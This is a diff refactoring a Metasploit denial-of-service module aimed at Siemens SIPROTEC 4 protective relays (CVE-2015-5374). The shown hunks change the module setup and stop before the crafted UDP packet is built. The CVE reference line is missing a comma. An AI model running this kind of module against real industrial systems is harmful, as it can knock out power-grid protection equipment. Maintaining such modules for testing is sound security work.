@@ -2,12 +2,11 @@
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-require 'msf/core'
 class MetasploitModule < Msf::Auxiliary
     include Msf::Exploit::Remote::Udp
     include Msf::Auxiliary::Dos
     def initialize(info = {})
-        super(update_info(info,
+        super(
             'Name'           => 'Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module - Denial of Service',
             'Description'    => %q{
                 This module sends a specially crafted packet to port 50000/UDP
@@ -23,8 +22,8 @@ class MetasploitModule < Msf::Auxiliary
                     [ 'CVE' '2015-5374' ],
                     [ 'URL', 'https://www.exploit-db.com/exploits/44103/' ],
                     [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01' ]
-                ]))
-            register_options([Opt::RPORT(50000),], self.class)
+                ])
+            register_options([Opt::RPORT(50000),])
     end
     def run
         connect_udp
